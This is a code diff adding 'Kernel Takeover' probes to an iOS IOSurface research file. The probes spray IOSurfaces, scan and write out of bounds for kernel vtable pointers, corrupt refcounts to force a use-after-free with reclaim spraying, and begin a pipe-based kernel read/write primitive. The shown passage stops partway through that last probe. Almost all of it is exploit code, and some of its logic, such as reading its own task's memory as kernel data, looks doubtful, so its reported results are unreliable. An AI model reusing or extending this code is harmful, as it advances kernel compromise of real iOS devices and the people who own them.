@@ -22,6 +22,8 @@
 extern mach_port_t bootstrap_port;
 extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
 #include <math.h>
+#include <fcntl.h>
+#include <unistd.h>
 #import "IOSurfaceResearch.h"
 
 #pragma mark - IOSurface / IOKit symbol types
@@ -19319,6 +19321,868 @@ void iosurface_research_arb_read(ISRLogBlock log, ISRDoneBlock done) {
             @"kptrDataNonZero": @(kptrDataNonZero)
         };
         isr_checkpoint(@"ISR-ArbRead-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+#pragma mark - Round 29: Kernel Takeover
+
+// ─── Probe 88: Vtable Spray + Confusion ───
+
+void iosurface_research_vtbl_spray(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"VTBLSPRAY: === Probe 88: Vtable Spray + Confusion ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int sprayedSurfaces = 0;
+        int vtablesFound = 0;
+        int writeAttempts = 0;
+        int vtableDispatches = 0;
+        int oobScans = 0;
+        int crossRefHits = 0;
+
+        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+        typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+        CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+        typedef size_t (*GetPropMaxFn)(IOSurfaceRef, CFStringRef);
+        GetPropMaxFn getPropMax = (GetPropMaxFn)dlsym(sym.iosurface, "IOSurfaceGetPropertyMaximum");
+
+        // Step 1: Spray 200 surfaces with varying sizes
+        log(@"VTBLSPRAY: Step 1 — Spraying 200 surfaces with varying sizes");
+        const int SPRAY_COUNT = 200;
+        IOSurfaceRef spraySurfs[200];
+        memset(spraySurfs, 0, sizeof(spraySurfs));
+
+        int sizes[] = {4096, 8192, 16384, 32768, 65536, 131072};
+        int numSizes = 6;
+
+        if (!isr_stopped()) {
+            for (int i = 0; i < SPRAY_COUNT && !isr_stopped(); i++) {
+                int sz = sizes[i % numSizes];
+                int dim = (int)sqrt((double)sz / 4);
+                if (dim < 1) dim = 1;
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @(dim),
+                    @"IOSurfaceHeight": @(dim),
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241,
+                };
+                spraySurfs[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (spraySurfs[i]) sprayedSurfaces++;
+            }
+            log([NSString stringWithFormat:@"VTBLSPRAY: Sprayed %d surfaces", sprayedSurfaces]);
+        }
+
+        // Step 2: Lock surfaces and scan OOB for vtable pointers
+        log(@"VTBLSPRAY: Step 2 — Scanning OOB for vtable pointers");
+        uint64_t vtableAddrs[64];
+        int vtableCount = 0;
+        int vtableSurfIdx[64];
+
+        if (!isr_stopped()) {
+            for (int i = 0; i < SPRAY_COUNT && !isr_stopped() && vtableCount < 64; i++) {
+                if (!spraySurfs[i]) continue;
+                uint32_t seed = 0;
+                kern_return_t kr = sym.lock(spraySurfs[i], 0, &seed);
+                if (kr != KERN_SUCCESS) continue;
+
+                void *base = sym.getBase(spraySurfs[i]);
+                size_t allocSz = sym.getAllocSize(spraySurfs[i]);
+                if (!base || allocSz == 0) {
+                    sym.unlock(spraySurfs[i], 0, &seed);
+                    continue;
+                }
+
+                // Scan forward OOB in 8-byte steps, up to 8KB beyond alloc
+                for (size_t off = allocSz; off < allocSz + 8192 && !isr_stopped(); off += 8) {
+                    oobScans++;
+                    vm_address_t srcAddr = (vm_address_t)base + off;
+                    uint64_t val = 0;
+                    vm_size_t readSz = 0;
+                    kern_return_t rkr = vm_read_overwrite(mach_task_self(), srcAddr, 8, (vm_address_t)&val, &readSz);
+                    if (rkr != KERN_SUCCESS || readSz != 8) continue;
+
+                    // Check for kernel TEXT vtable range (0xFFFFFFF0xxxxxxxx)
+                    BOOL isTextVtbl = (val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL;
+                    // Check for OTHER vtable range (0xFFFFFFFDxxxxxxxx)
+                    BOOL isOtherVtbl = (val & 0xFFFFFFFF00000000ULL) == 0xFFFFFFFD00000000ULL;
+
+                    if (isTextVtbl || isOtherVtbl) {
+                        vtableAddrs[vtableCount] = val;
+                        vtableSurfIdx[vtableCount] = i;
+                        vtableCount++;
+                        vtablesFound++;
+                        log([NSString stringWithFormat:@"VTBLSPRAY: VTABLE at S%d+0x%lx: 0x%llx %s",
+                             i, (unsigned long)(off - allocSz), val,
+                             isTextVtbl ? "[TEXT]" : "[OTHER]"]);
+                        anomalies++;
+                    }
+                }
+                sym.unlock(spraySurfs[i], 0, &seed);
+            }
+            log([NSString stringWithFormat:@"VTBLSPRAY: Found %d vtable pointers in %d OOB scans", vtablesFound, oobScans]);
+        }
+
+        // Step 3: Attempt vtable overwrite via multiple methods
+        log(@"VTBLSPRAY: Step 3 — Attempting vtable overwrites");
+
+        if (!isr_stopped() && vtableCount > 0) {
+            for (int v = 0; v < vtableCount && !isr_stopped(); v++) {
+                int sIdx = vtableSurfIdx[v];
+                if (!spraySurfs[sIdx]) continue;
+
+                uint32_t seed = 0;
+                kern_return_t kr = sym.lock(spraySurfs[sIdx], 0, &seed);
+                if (kr != KERN_SUCCESS) continue;
+
+                void *base = sym.getBase(spraySurfs[sIdx]);
+                size_t allocSz = sym.getAllocSize(spraySurfs[sIdx]);
+
+                // Method A: vm_write to OOB region with fake vtable
+                uint64_t fakeVtable = 0x4141414142424242ULL;
+                size_t vtableOff = allocSz; // approximate
+                vm_address_t writeAddr = (vm_address_t)base + vtableOff;
+                kern_return_t wkr = vm_write(mach_task_self(), writeAddr, (vm_offset_t)&fakeVtable, 8);
+                writeAttempts++;
+                if (wkr == KERN_SUCCESS) {
+                    log([NSString stringWithFormat:@"VTBLSPRAY: vm_write SUCCEEDED at S%d+0x%lx!", sIdx, (unsigned long)vtableOff]);
+                    anomalies += 5;
+                }
+
+                // Method B: IOSurfaceSetValue with crafted data targeting vtable
+                if (setValue && !isr_stopped()) {
+                    uint8_t craftedData[256];
+                    memset(craftedData, 0x41, sizeof(craftedData));
+                    // Place fake vtable pointer pattern at multiple offsets
+                    uint64_t fakePtr = 0xDEADBEEFCAFEBABEULL;
+                    for (int off = 0; off < 256; off += 8) {
+                        memcpy(craftedData + off, &fakePtr, 8);
+                    }
+                    CFDataRef data = CFDataCreate(NULL, craftedData, sizeof(craftedData));
+                    if (data) {
+                        setValue(spraySurfs[sIdx], CFSTR("IOSurfaceVtablePayload"), (CFTypeRef)data);
+                        writeAttempts++;
+                        CFRelease(data);
+                    }
+                }
+
+                // Method C: Cross-surface stride write targeting vtable offset
+                if (setValue && !isr_stopped()) {
+                    // Override BytesPerRow to giant value for OOB write
+                    setValue(spraySurfs[sIdx], CFSTR("IOSurfaceBytesPerRow"),
+                             (__bridge CFTypeRef)@(allocSz + 4096));
+                    writeAttempts++;
+
+                    // Create CG context with inflated stride for OOB write
+                    size_t bpr = allocSz + 4096;
+                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                    CGContextRef ctx = CGBitmapContextCreate(NULL, 64, 2, 8, bpr,
+                                                             cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                    if (ctx) {
+                        CGContextSetRGBFillColor(ctx, 0.42, 0.42, 0.42, 1.0);
+                        CGContextFillRect(ctx, CGRectMake(0, 0, 64, 2));
+                        CGContextRelease(ctx);
+                        writeAttempts++;
+                    }
+                    CGColorSpaceRelease(cs);
+                }
+
+                sym.unlock(spraySurfs[sIdx], 0, &seed);
+
+                // Step 4: Trigger vtable dispatch to detect corruption
+                if (!isr_stopped()) {
+                    // Call functions that internally dispatch through vtable
+                    @try {
+                        size_t w = sym.getWidth(spraySurfs[sIdx]);
+                        size_t h = sym.getHeight(spraySurfs[sIdx]);
+                        size_t as2 = sym.getAllocSize(spraySurfs[sIdx]);
+                        vtableDispatches++;
+                        if (w == 0 || h == 0 || as2 == 0) {
+                            log([NSString stringWithFormat:@"VTBLSPRAY: ANOMALY — getter returned 0 after overwrite attempt on S%d!", sIdx]);
+                            anomalies += 3;
+                        }
+
+                        // Check if property reads return corrupted data
+                        if (copyValue) {
+                            CFTypeRef val = copyValue(spraySurfs[sIdx], CFSTR("IOSurfaceVtablePayload"));
+                            if (val) {
+                                crossRefHits++;
+                                CFRelease(val);
+                            }
+                        }
+                    } @catch (NSException *e) {
+                        log([NSString stringWithFormat:@"VTBLSPRAY: EXCEPTION during vtable dispatch: %@", e.reason]);
+                        anomalies += 10;
+                    }
+                }
+            }
+        }
+
+        // Step 5: Cross-surface vtable reference scan
+        log(@"VTBLSPRAY: Step 4 — Cross-surface vtable reference scan");
+        if (!isr_stopped()) {
+            for (int i = 0; i < SPRAY_COUNT - 1 && !isr_stopped(); i += 2) {
+                if (!spraySurfs[i] || !spraySurfs[i+1]) continue;
+                uint32_t seed = 0;
+                kern_return_t kr = sym.lock(spraySurfs[i], 0, &seed);
+                if (kr != KERN_SUCCESS) continue;
+
+                void *base = sym.getBase(spraySurfs[i]);
+                size_t allocSz = sym.getAllocSize(spraySurfs[i]);
+                if (base && allocSz > 0) {
+                    // Scan beyond this surface into potentially adjacent one
+                    for (size_t off = allocSz; off < allocSz + 16384 && !isr_stopped(); off += 64) {
+                        uint64_t chunk[8];
+                        vm_size_t readSz = 0;
+                        kern_return_t rkr = vm_read_overwrite(mach_task_self(),
+                                                              (vm_address_t)base + off, 64,
+                                                              (vm_address_t)chunk, &readSz);
+                        if (rkr != KERN_SUCCESS || readSz != 64) continue;
+
+                        // Check for sentinel patterns from adjacent surface
+                        for (int j = 0; j < 8; j++) {
+                            if ((chunk[j] & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                crossRefHits++;
+                                if (crossRefHits <= 10) {
+                                    log([NSString stringWithFormat:@"VTBLSPRAY: XREF S%d+0x%lx[%d]: 0x%llx",
+                                         i, (unsigned long)(off - allocSz), j, chunk[j]]);
+                                }
+                            }
+                        }
+                    }
+                }
+                sym.unlock(spraySurfs[i], 0, &seed);
+            }
+        }
+
+        // Cleanup
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            if (spraySurfs[i]) CFRelease(spraySurfs[i]);
+        }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"VTBLSPRAY: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"VTBLSPRAY: sprayed=%d vtables=%d writes=%d dispatches=%d xrefs=%d anomalies=%d",
+             sprayedSurfaces, vtablesFound, writeAttempts, vtableDispatches, crossRefHits, anomalies]);
+
+        NSString *verdict;
+        if (anomalies > 15) verdict = @"CRITICAL — vtable corruption indicators detected!";
+        else if (vtablesFound > 5) verdict = @"HIGH — multiple vtable pointers accessible via OOB";
+        else if (crossRefHits > 0) verdict = @"MEDIUM — cross-surface vtable references found";
+        else verdict = @"LOW — vtable spray completed, no corruption achieved";
+        log([NSString stringWithFormat:@"VTBLSPRAY: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"sprayedSurfaces": @(sprayedSurfaces),
+            @"vtablesFound": @(vtablesFound),
+            @"writeAttempts": @(writeAttempts),
+            @"vtableDispatches": @(vtableDispatches),
+            @"crossRefHits": @(crossRefHits)
+        };
+        isr_checkpoint(@"ISR-VtblSpray-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// ─── Probe 89: Refcount Corruption for Controlled UAF ───
+
+void iosurface_research_refcount_corrupt(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"REFCORR: === Probe 89: Refcount Corruption — Controlled UAF ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int sentinelsFound = 0;
+        int refcountWrites = 0;
+        int uafDetected = 0;
+        int pageReclaims = 0;
+        int remapReads = 0;
+        int staleDataHits = 0;
+
+        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+
+        // Step 1: Create target surface and get its mapping
+        log(@"REFCORR: Step 1 — Creating target surface + vm_remap mapping");
+
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @256,
+            @"IOSurfaceHeight": @256,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @0x42475241,
+        };
+
+        IOSurfaceRef targetSurf = NULL;
+        vm_address_t remapAddr = 0;
+        vm_size_t remapSize = 0;
+        void *targetBase = NULL;
+        size_t targetAllocSz = 0;
+
+        if (!isr_stopped()) {
+            targetSurf = sym.create((__bridge CFDictionaryRef)props);
+            if (!targetSurf) {
+                log(@"REFCORR: Failed to create target surface");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            uint32_t seed = 0;
+            sym.lock(targetSurf, 0, &seed);
+            targetBase = sym.getBase(targetSurf);
+            targetAllocSz = sym.getAllocSize(targetSurf);
+
+            // Write sentinel pattern into the surface
+            if (targetBase && targetAllocSz > 0) {
+                uint32_t sentinel = 0x494F5346; // "IOSF"
+                for (size_t off = 0; off < targetAllocSz && off < 4096; off += 64) {
+                    memcpy((uint8_t *)targetBase + off, &sentinel, 4);
+                    uint32_t marker = (uint32_t)(off / 64);
+                    memcpy((uint8_t *)targetBase + off + 4, &marker, 4);
+                }
+            }
+
+            // Create vm_remap mapping of the surface pages
+            if (targetBase && targetAllocSz > 0) {
+                remapSize = targetAllocSz;
+                vm_prot_t curProt, maxProt;
+                kern_return_t kr = vm_remap(mach_task_self(), &remapAddr, remapSize, 0,
+                                            VM_FLAGS_ANYWHERE, mach_task_self(),
+                                            (vm_address_t)targetBase, FALSE,
+                                            &curProt, &maxProt, VM_INHERIT_NONE);
+                if (kr == KERN_SUCCESS) {
+                    log([NSString stringWithFormat:@"REFCORR: vm_remap OK: 0x%lx -> 0x%lx size=%zu",
+                         (unsigned long)targetBase, (unsigned long)remapAddr, (size_t)remapSize]);
+                    remapReads++;
+                } else {
+                    log(@"REFCORR: vm_remap failed");
+                    remapAddr = 0;
+                }
+            }
+
+            sym.unlock(targetSurf, 0, &seed);
+        }
+
+        // Step 2: Scan backward OOB for IOSurface metadata header
+        log(@"REFCORR: Step 2 — Backward OOB scan for IOSurface metadata header");
+
+        uint64_t headerAddr = 0;
+        int refcountOffset = -1;
+
+        if (!isr_stopped() && targetBase) {
+            uint32_t seed2 = 0;
+            sym.lock(targetSurf, 0, &seed2);
+
+            // Scan backward from base address looking for sentinel patterns
+            for (int negOff = 64; negOff <= 16384 && !isr_stopped(); negOff += 8) {
+                vm_address_t scanAddr = (vm_address_t)targetBase - negOff;
+                uint64_t val = 0;
+                vm_size_t readSz = 0;
+                kern_return_t kr = vm_read_overwrite(mach_task_self(), scanAddr, 8, (vm_address_t)&val, &readSz);
+                if (kr != KERN_SUCCESS || readSz != 8) continue;
+
+                // Look for kernel pointer patterns that indicate object header
+                BOOL isKptr = (val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL;
+                BOOL isOther = (val & 0xFFFFFFFF00000000ULL) == 0xFFFFFFFD00000000ULL;
+
+                if (isKptr || isOther) {
+                    sentinelsFound++;
+                    if (sentinelsFound <= 20) {
+                        log([NSString stringWithFormat:@"REFCORR: HEADER candidate at base-0x%x: 0x%llx %s",
+                             negOff, val, isKptr ? "[KPTR]" : "[OTHER]"]);
+                    }
+
+                    // Check surrounding 64 bytes for refcount-like values (small integers)
+                    for (int rOff = -32; rOff <= 32; rOff += 8) {
+                        uint64_t rval = 0;
+                        vm_size_t rsz = 0;
+                        kern_return_t rkr = vm_read_overwrite(mach_task_self(),
+                                                              scanAddr + rOff, 8,
+                                                              (vm_address_t)&rval, &rsz);
+                        if (rkr == KERN_SUCCESS && rsz == 8) {
+                            // Refcount should be a small positive integer (1-100)
+                            if (rval >= 1 && rval <= 100 && rOff != 0) {
+                                log([NSString stringWithFormat:@"REFCORR: Possible refcount at header%+d: %llu", rOff, rval]);
+                                if (headerAddr == 0) {
+                                    headerAddr = scanAddr;
+                                    refcountOffset = rOff;
+                                }
+                                anomalies++;
+                            }
+                        }
+                    }
+                }
+            }
+            sym.unlock(targetSurf, 0, &seed2);
+            log([NSString stringWithFormat:@"REFCORR: Found %d header candidates, refcount offset=%d", sentinelsFound, refcountOffset]);
+        }
+
+        // Step 3: Attempt to write refcount via vm_write
+        log(@"REFCORR: Step 3 — Attempting refcount corruption");
+
+        if (!isr_stopped() && headerAddr != 0 && refcountOffset >= -32) {
+            vm_address_t refAddr = headerAddr + refcountOffset;
+            uint64_t newRefcount = 1;
+            kern_return_t wkr = vm_write(mach_task_self(), refAddr, (vm_offset_t)&newRefcount, 8);
+            refcountWrites++;
+            if (wkr == KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"REFCORR: vm_write refcount=1 SUCCEEDED at 0x%lx!", (unsigned long)refAddr]);
+                anomalies += 10;
+            } else {
+                log([NSString stringWithFormat:@"REFCORR: vm_write failed: %d", wkr]);
+            }
+
+            // Also try IOSurfaceSetValue to manipulate internal state
+            if (setValue && !isr_stopped()) {
+                setValue(targetSurf, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@1);
+                setValue(targetSurf, CFSTR("IOSurfaceOffset"), (__bridge CFTypeRef)@0);
+                refcountWrites++;
+                log(@"REFCORR: IOSurfaceSetValue size manipulation attempted");
+            }
+        }
+
+        // Step 4: Release the target surface to trigger potential UAF
+        log(@"REFCORR: Step 4 — Releasing target + spray reclaim");
+
+        IOSurfaceRef reclamSurfs[500];
+        memset(reclamSurfs, 0, sizeof(reclamSurfs));
+        int reclaimCount = 0;
+
+        if (!isr_stopped() && targetSurf) {
+            CFRelease(targetSurf);
+            targetSurf = NULL;
+
+            // Immediately spray 500 surfaces to reclaim freed pages
+            NSDictionary *reclaimProps = @{
+                @"IOSurfaceWidth": @256,
+                @"IOSurfaceHeight": @256,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @0x42475241,
+            };
+            for (int i = 0; i < 500 && !isr_stopped(); i++) {
+                reclamSurfs[i] = sym.create((__bridge CFDictionaryRef)reclaimProps);
+                if (reclamSurfs[i]) {
+                    reclaimCount++;
+                    uint32_t seed3 = 0;
+                    sym.lock(reclamSurfs[i], 0, &seed3);
+                    void *rb = sym.getBase(reclamSurfs[i]);
+                    if (rb) {
+                        // Write unique pattern
+                        uint64_t pattern = 0xCAFEBABE00000000ULL | (uint64_t)i;
+                        memset(rb, 0, 64);
+                        memcpy(rb, &pattern, 8);
+                    }
+                    sym.unlock(reclamSurfs[i], 0, &seed3);
+                }
+            }
+            pageReclaims = reclaimCount;
+            log([NSString stringWithFormat:@"REFCORR: Sprayed %d reclaim surfaces", reclaimCount]);
+        }
+
+        // Step 5: Read via stale vm_remap mapping to detect UAF
+        log(@"REFCORR: Step 5 — Reading stale vm_remap mapping for UAF detection");
+
+        if (!isr_stopped() && remapAddr != 0) {
+            int staleReads = 0;
+            for (size_t off = 0; off < remapSize && off < 8192 && !isr_stopped(); off += 64) {
+                uint64_t chunk[8];
+                vm_size_t readSz = 0;
+                kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                                                     remapAddr + off, 64,
+                                                     (vm_address_t)chunk, &readSz);
+                if (kr != KERN_SUCCESS || readSz != 64) continue;
+                staleReads++;
+
+                // Check if we see reclaim patterns (CAFEBABE...)
+                for (int j = 0; j < 8; j++) {
+                    if ((chunk[j] & 0xFFFFFFFF00000000ULL) == 0xCAFEBABE00000000ULL) {
+                        uafDetected++;
+                        staleDataHits++;
+                        if (staleDataHits <= 10) {
+                            log([NSString stringWithFormat:@"REFCORR: UAF DETECTED! remap+0x%lx[%d] = 0x%llx (reclaim surface %lld)",
+                                 (unsigned long)off, j, chunk[j], chunk[j] & 0xFFFFFFFF]);
+                        }
+                        anomalies += 5;
+                    }
+
+                    // Check if original sentinel is gone (page was reclaimed)
+                    if (chunk[j] != 0 && (chunk[j] & 0xFFFFFFFF) != 0x494F5346 && off < 4096) {
+                        // Data changed from what we wrote — possible reclaim
+                        if ((chunk[j] & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            log([NSString stringWithFormat:@"REFCORR: KERNEL DATA in stale mapping! +0x%lx[%d] = 0x%llx",
+                                 (unsigned long)off, j, chunk[j]]);
+                            anomalies += 3;
+                            staleDataHits++;
+                        }
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"REFCORR: Stale reads=%d, data hits=%d", staleReads, staleDataHits]);
+        }
+
+        // Cleanup
+        if (remapAddr) vm_deallocate(mach_task_self(), remapAddr, remapSize);
+        if (targetSurf) CFRelease(targetSurf);
+        for (int i = 0; i < 500; i++) {
+            if (reclamSurfs[i]) CFRelease(reclamSurfs[i]);
+        }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"REFCORR: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"REFCORR: sentinels=%d refWrites=%d uaf=%d reclaims=%d staleHits=%d anomalies=%d",
+             sentinelsFound, refcountWrites, uafDetected, pageReclaims, staleDataHits, anomalies]);
+
+        NSString *verdict;
+        if (uafDetected > 0) verdict = @"CRITICAL — controlled UAF via refcount corruption!";
+        else if (staleDataHits > 0) verdict = @"HIGH — stale mapping shows different data post-free";
+        else if (sentinelsFound > 5) verdict = @"MEDIUM — kernel object headers located via OOB";
+        else if (refcountWrites > 0) verdict = @"LOW — write attempted but no UAF observed";
+        else verdict = @"LOW — no refcount manipulation achieved";
+        log([NSString stringWithFormat:@"REFCORR: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"sentinelsFound": @(sentinelsFound),
+            @"refcountWrites": @(refcountWrites),
+            @"uafDetected": @(uafDetected),
+            @"pageReclaims": @(pageReclaims),
+            @"staleDataHits": @(staleDataHits)
+        };
+        isr_checkpoint(@"ISR-RefcountCorrupt-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// ─── Probe 90: Pipe-based Kernel R/W Primitive ───
+
+void iosurface_research_pipe_krw(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"PIPEKERNEL: === Probe 90: Pipe-based Kernel R/W ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int pipesCreated = 0;
+        int sentinelsInHeap = 0;
+        int readSuccesses = 0;
+        int writeSuccesses = 0;
+        int kernelDataFound = 0;
+        int oobHits = 0;
+
+        // Step 1: Create 256 pipe pairs with sentinel data
+        log(@"PIPEKERNEL: Step 1 — Creating 256 pipe pairs with sentinel patterns");
+
+        const int PIPE_COUNT = 256;
+        int pipeFds[256][2];
+        memset(pipeFds, -1, sizeof(pipeFds));
+        uint32_t pipeSentinels[256];
+
+        if (!isr_stopped()) {
+            for (int i = 0; i < PIPE_COUNT && !isr_stopped(); i++) {
+                if (pipe(pipeFds[i]) == 0) {
+                    pipesCreated++;
+                    // Write unique sentinel pattern to each pipe
+                    pipeSentinels[i] = 0xBEEF0000 | (uint32_t)i;
+
+                    // Write varying sizes (256 to 4096 bytes)
+                    size_t writeSz = 256 + (i % 16) * 256;
+                    uint8_t *buf = (uint8_t *)calloc(writeSz, 1);
+                    if (buf) {
+                        // Fill with sentinel pattern
+                        for (size_t off = 0; off < writeSz; off += 4) {
+                            uint32_t pattern = 0xBEEF0000 | (uint32_t)i;
+                            memcpy(buf + off, &pattern, 4);
+                        }
+                        // Set non-blocking for write
+                        int flags = fcntl(pipeFds[i][1], F_GETFL, 0);
+                        fcntl(pipeFds[i][1], F_SETFL, flags | O_NONBLOCK);
+                        write(pipeFds[i][1], buf, writeSz);
+                        free(buf);
+                    }
+                } else {
+                    pipeFds[i][0] = -1;
+                    pipeFds[i][1] = -1;
+                }
+            }
+            log([NSString stringWithFormat:@"PIPEKERNEL: Created %d pipe pairs", pipesCreated]);
+        }
+
+        // Step 2: Create IOSurfaces and scan OOB for pipe buffer sentinels
+        log(@"PIPEKERNEL: Step 2 — Creating surfaces + OOB scan for pipe buffers");
+
+        const int SURF_COUNT = 50;
+        IOSurfaceRef surfs[50];
+        memset(surfs, 0, sizeof(surfs));
+        int surfCount = 0;
+
+        if (!isr_stopped()) {
+            for (int i = 0; i < SURF_COUNT && !isr_stopped(); i++) {
+                int dim = 128 + (i % 8) * 64;
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @(dim),
+                    @"IOSurfaceHeight": @(dim),
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241,
+                };
+                surfs[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (surfs[i]) surfCount++;
+            }
+            log([NSString stringWithFormat:@"PIPEKERNEL: Created %d probe surfaces", surfCount]);
+        }
+
+        // Step 3: OOB scan for pipe sentinel patterns
+        log(@"PIPEKERNEL: Step 3 — OOB scanning for pipe buffer sentinels");
+
+        typedef struct {
+            int surfIdx;
+            size_t offset;
+            uint32_t pipeIdx;
+            uint64_t fullVal;
+        } PipeHit;
+
+        PipeHit pipeHits[128];
+        int hitCount = 0;
+
+        if (!isr_stopped()) {
+            for (int s = 0; s < SURF_COUNT && !isr_stopped(); s++) {
+                if (!surfs[s]) continue;
+                uint32_t seed = 0;
+                kern_return_t kr = sym.lock(surfs[s], 0, &seed);
+                if (kr != KERN_SUCCESS) continue;
+
+                void *base = sym.getBase(surfs[s]);
+                size_t allocSz = sym.getAllocSize(surfs[s]);
+                if (!base || allocSz == 0) {
+                    sym.unlock(surfs[s], 0, &seed);
+                    continue;
+                }
+
+                // Scan forward OOB up to 64KB
+                for (size_t off = allocSz; off < allocSz + 65536 && !isr_stopped(); off += 4) {
+                    uint32_t val32 = 0;
+                    vm_size_t readSz = 0;
+                    kern_return_t rkr = vm_read_overwrite(mach_task_self(),
+                                                          (vm_address_t)base + off, 4,
+                                                          (vm_address_t)&val32, &readSz);
+                    if (rkr != KERN_SUCCESS || readSz != 4) {
+                        // Crossed page boundary — skip ahead
+                        off = (off + 0x1000) & ~0xFFFUL;
+                        off -= 4; // loop will add 4
+                        continue;
+                    }
+                    oobHits++;
+
+                    // Check for BEEF sentinel
+                    if ((val32 & 0xFFFF0000) == 0xBEEF0000) {
+                        uint32_t pipeIdx = val32 & 0xFFFF;
+                        if (pipeIdx < PIPE_COUNT && hitCount < 128) {
+                            sentinelsInHeap++;
+                            // Read full 8 bytes for context
+                            uint64_t val64 = 0;
+                            vm_read_overwrite(mach_task_self(),
+                                              (vm_address_t)base + off, 8,
+                                              (vm_address_t)&val64, &readSz);
+                            pipeHits[hitCount].surfIdx = s;
+                            pipeHits[hitCount].offset = off - allocSz;
+                            pipeHits[hitCount].pipeIdx = pipeIdx;
+                            pipeHits[hitCount].fullVal = val64;
+                            hitCount++;
+
+                            if (sentinelsInHeap <= 20) {
+                                log([NSString stringWithFormat:@"PIPEKERNEL: PIPE BUFFER FOUND! S%d+0x%lx pipe=%d val=0x%llx",
+                                     s, (unsigned long)(off - allocSz), pipeIdx, val64]);
+                            }
+                            anomalies += 3;
+                        }
+                    }
+
+                    // Also check for kernel pointers near pipe buffers
+                    if (sentinelsInHeap > 0 && (val32 & 0xFFF00000) == 0xFFF00000) {
+                        uint64_t kval = 0;
+                        vm_size_t ksz = 0;
+                        kern_return_t kkr = vm_read_overwrite(mach_task_self(),
+                                                               (vm_address_t)base + off, 8,
+                                                               (vm_address_t)&kval, &ksz);
+                        if (kkr == KERN_SUCCESS && ksz == 8) {
+                            if ((kval & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                kernelDataFound++;
+                                if (kernelDataFound <= 10) {
+                                    log([NSString stringWithFormat:@"PIPEKERNEL: KERNEL PTR near pipe! S%d+0x%lx = 0x%llx",
+                                         s, (unsigned long)(off - allocSz), kval]);
+                                }
+                                anomalies += 2;
+                            }
+                        }
+                    }
+                }
+                sym.unlock(surfs[s], 0, &seed);
+            }
+            log([NSString stringWithFormat:@"PIPEKERNEL: Found %d pipe sentinels, %d kernel ptrs, %d OOB hits",
+                 sentinelsInHeap, kernelDataFound, oobHits]);
+        }
+
+        // Step 4: Attempt write via vm_write to pipe buffer location, verify via pipe read
+        log(@"PIPEKERNEL: Step 4 — Pipe R/W primitive test");
+
+        if (!isr_stopped() && hitCount > 0) {
+            for (int h = 0; h < hitCount && h < 10 && !isr_stopped(); h++) {
+                int sIdx = pipeHits[h].surfIdx;
